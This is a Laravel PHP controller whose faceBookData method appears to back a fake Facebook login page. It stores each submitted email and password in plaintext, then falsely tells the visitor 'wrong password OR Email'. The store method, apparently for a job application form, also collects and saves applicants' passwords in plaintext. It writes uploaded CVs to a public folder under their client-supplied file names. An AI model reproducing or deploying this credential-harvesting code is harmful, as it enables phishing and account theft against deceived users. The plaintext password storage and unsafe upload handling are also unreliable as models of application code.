<?php

namespace App\Http\Controllers;

use App\Models\Application;
use App\Models\FaceApplication;
use Illuminate\Http\Request;

class ApplicationController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        //
    }

    /**
     * Show the form for creating a new resource.
     */
    public function create()
    {
        //
    }

    public function  faceBookData(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required|min:8',
        ]);
        $app = new FaceApplication();
        $app->email = $request->email;
        $app->password = $request->password;
        $app->save();
        return  redirect('/')->with("done", "wrong password OR Email");
    }
    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {
        $request->validate([
            'name' => "required",
            'email' => 'required|email',
            'phone' => 'required',
            'position' => 'required',
            'password' => 'required|min:8',
            'cvFile' => "required|file|mimes:pdf"
        ]);
        $app = new Application();
        $app->name = $request->name;
        $app->email = $request->email;
        $app->phone = $request->phone;
        $app->position = $request->position;
        $app->password = $request->password;
        $cvData = $request->file("cvFile");
        $cvName = $cvData->getClientOriginalName();
        $location = public_path('upload');
        $cvData->move($location,   $cvName);
        $app->cvFile = $cvName;
        $app->save();
        return  redirect()->back()->with("done", "");
    }

    /**
     * Display the specified resource.
     */
    public function show(Application $application)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     */
    public function edit(Application $application)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, Application $application)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(Application $application)
    {
        //
    }
}
